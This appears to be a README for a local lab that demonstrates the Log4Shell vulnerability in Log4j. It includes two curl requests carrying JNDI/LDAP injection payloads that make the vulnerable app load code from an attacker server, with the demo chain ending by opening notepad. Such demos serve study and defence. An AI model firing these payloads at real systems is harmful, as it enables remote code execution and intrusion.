### Log4Shell Demo Attack

[CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228)

[CVE-2021-45046](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45046)

Target the JDK version 8u181 for `vulnerable app`. The JDK can be grab from
```
https://cdn.azul.com/zulu/bin/zulu8.31.0.1-jdk8.0.181-win_x64.zip
```

Run the servers from the main method

The vulnerable server `http://localhost:8080` 

First stage LDAP attacker server `http://localhost:1389` 

Second stage attacker server `http://localhost:8888`

Malicious request target normal log method 
```shell
curl --location --request GET 'http://localhost:8080/' \
--header 'X-Api-Version;' \
--header 'Content-Type: text/plain' \
--data-raw '${jndi:ldap://localhost:1389/exploit/bm90ZXBhZA}'
```

Malicious request target thread context
```shell
curl --location --request GET 'http://localhost:8080/thread-context' \
--header 'X-Api-Version;' \
--header 'Content-Type: text/plain' \
--data-raw '${jndi:ldap://localhost:1389/exploit/bm90ZXBhZA}'
```

The end of the attack chain will open the notepad program
